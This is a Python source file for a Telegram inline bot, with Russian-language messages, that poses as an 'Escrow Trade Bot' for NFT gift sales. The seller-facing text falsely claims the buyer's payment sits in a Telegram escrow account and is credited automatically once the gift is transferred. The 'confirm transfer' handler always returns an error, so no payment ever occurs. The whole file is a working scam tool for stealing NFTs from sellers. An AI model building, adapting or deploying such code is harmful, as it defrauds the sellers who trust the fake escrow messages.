import asyncio
import os
import uuid
import logging
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    InlineQuery, 
    InlineQueryResultArticle, 
    InputTextMessageContent, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton,
    CallbackQuery,
    LinkPreviewOptions
)

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.getenv("BOT_TOKEN")

router = Router()

# База картинок под популярные подарки (можно дополнять)
GIFT_IMAGES = {
    "swagbag": "https://cache.tonapi.io/imgproxy/6701a51167990ef1cf0332f14371994e77ddcd7a988d87ea310fdf915f0eb5e9/rs:fill:600:600:1/g:no/aHR0cHM6Ly90Lm1lL25mdC9Td2FnQmFnLTE1MjM0Ny5wbmc.webp",
    "pepe": "https://cache.tonapi.io/imgproxy/default/rs:fill:600:600:1/g:no/aHR0cHM6Ly90Lm1lL25mdC9QZXBlLTQzODQucG5n.webp"
}
DEFAULT_GIFT_IMAGE = "https://cdn-icons-png.flaticon.com/512/4213/4213958.png"

@router.inline_query()
async def process_inline_trade(inline_query: InlineQuery):
    query_text = inline_query.query.strip()
    args = query_text.split()
    
    # Формат ввода: swagbag 152347 17 gram @seller_username
    if len(args) < 3:
        return

    item_name = args[0].capitalize()
    item_id = args[1]
    price = args[2]
    currency = args[3].upper() if len(args) > 3 and not args[3].startswith("@") else "TON"

    # Ищем юзернейм продавца среди аргументов (начинается с @)
    seller_tag = "Владелец предмета"
    for arg in args:
        if arg.startswith("@"):
            seller_tag = arg
            break

    trade_id = f"TG-{str(uuid.uuid4())[:8].upper()}"
    buyer_user = inline_query.from_user
    buyer_tag = f"@{buyer_user.username}" if buyer_user.username else buyer_user.first_name

    # Картинка предмета
    image_key = item_name.lower()
    image_url = GIFT_IMAGES.get(image_key, DEFAULT_GIFT_IMAGE)

    # Скрытый невидимый символ с ссылкой на картинку [&#8288;](URL) для генерации чистой карточки
    hidden_image_link = f"[&#8288;]({image_url})"

    message_text = (
        f"{hidden_image_link}🤝 **Предложение сделки [Escrow Trade Bot]**\n\n"
        f"📋 **Ордер:** `#{trade_id}`\n"
        f"📦 **Предмет:** {item_name} #{item_id}\n"
        f"💰 **Сумма резерва:** {price} {currency}\n\n"
        f"👤 **Покупатель:** {buyer_tag}\n"
        f"👤 **Продавец:** {seller_tag}\n\n"
        f"⏳ **Статус:** Ожидает подтверждения от продавца. Предложение действительно 24 часа."
    )

    # Кнопки 1-го этапа: 🎁 Передать NFT | ❌ Отклонить
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🎁 Передать NFT", 
                    callback_data=f"accept:{trade_id}:{item_name}:{item_id}:{price}:{currency}:{buyer_tag}:{seller_tag}"
                ),
                InlineKeyboardButton(
                    text="❌ Отклонить", 
                    callback_data=f"cancel:{trade_id}"
                )
            ]
        ]
    )

    result = InlineQueryResultArticle(
        id=trade_id,
        title=f"Купить {item_name} #{item_id} за {price} {currency}",
        description=f"Продавец: {seller_tag}",
        input_message_content=InputTextMessageContent(
            message_text=message_text,
            parse_mode="Markdown",
            link_preview_options=LinkPreviewOptions(
                url=image_url,
                prefer_large_media=True,
                show_above_text=False
            )
        ),
        reply_markup=keyboard
    )

    await inline_query.answer([result], cache_time=1)

# ==========================================
# ШАГ 2: Нажатие «🎁 Передать NFT» (Принятие сделки)
# ==========================================
@router.callback_query(F.data.startswith("accept:"))
async def accept_trade_handler(callback: CallbackQuery):
    data_parts = callback.data.split(":")
    trade_id = data_parts[1]
    item_name = data_parts[2]
    item_id = data_parts[3]
    price = data_parts[4]
    currency = data_parts[5]
    buyer_tag = data_parts[6]
    seller_tag = data_parts[7]

    image_url = GIFT_IMAGES.get(item_name.lower(), DEFAULT_GIFT_IMAGE)
    hidden_image_link = f"[&#8288;]({image_url})"
    nft_transfer_url = f"https://t.me/nft/{item_name}-{item_id}"

    # Текст с подробной инструкцией
    updated_text = (
        f"{hidden_image_link}📋 **Ордер #{trade_id}**\n\n"
        f"Покупатель зарезервировал **{price} {currency}** через эскроу-систему Telegram. "
        f"Средства хранятся на специальном эскроу-счёте и будут автоматически зачислены на ваш баланс сразу после передачи подарка.\n\n"
        f"**Инструкция для завершения сделки:**\n"
        f"1. Передайте подарок пользователю: {buyer_tag}\n"
        f"2. Нажмите «Передать NFT» и выберите **{item_name} #{item_id}**\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит **{price} {currency}** на ваш баланс. Резерв действует 24 часа."
    )

    # Кнопки 2-го этапа: Передать NFT ↗ (ссылка) / ✔️ Подтвердить передачу
    step2_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Передать NFT", 
                    url=nft_transfer_url
                )
            ],
            [
                InlineKeyboardButton(
                    text="✔️️ Подтвердить передачу", 
                    callback_data=f"confirm:{trade_id}"
                )
            ]
        ]
    )

    await callback.answer("Условия приняты! Передайте NFT по инструкции.")
    await callback.message.edit_text(
        text=updated_text,
        parse_mode="Markdown",
        reply_markup=step2_keyboard,
        link_preview_options=LinkPreviewOptions(
            url=image_url,
            prefer_large_media=True,
            show_above_text=False
        )
    )

# ==========================================
# ШАГ 3: Нажатие «✔️ Подтвердить передачу»
# ==========================================
@router.callback_query(F.data.startswith("confirm:"))
async def confirm_transfer_handler(callback: CallbackQuery):
    await callback.answer(
        text="⚠️ Ошибка: Предмет еще не передан пользователю. Пожалуйста, передайте NFT и нажмите снова.", 
        show_alert=True
    )

# ==========================================
# Отмена сделки
# ==========================================
@router.callback_query(F.data.startswith("cancel:"))
async def cancel_trade_handler(callback: CallbackQuery):
    await callback.answer(text="Сделка отменена.", show_alert=True)
    await callback.message.edit_text(
        text="❌ **Сделка была отменена.**",
        parse_mode="Markdown",
        reply_markup=None
    )

# Фейковый сервер для Render
async def handle_health_check(request):
    return web.Response(text="Bot is running!")

async def main():
    app = web.Application()
    app.router.add_get("/", handle_health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
